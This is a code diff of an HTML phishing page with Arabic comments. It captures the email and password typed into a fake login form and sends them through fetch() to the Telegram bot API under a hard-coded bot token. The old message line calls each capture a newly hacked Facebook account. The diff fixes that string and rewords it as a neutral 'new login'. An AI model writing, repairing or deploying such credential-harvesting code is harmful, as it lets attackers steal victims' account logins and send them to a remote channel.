@@ -60,7 +60,7 @@
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
-   <script>
+  <script>
     const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
@@ -79,7 +79,7 @@
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      const message = 📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
+      const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`;
 
       // إرسال البيانات للبوت باستخدام chatId
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
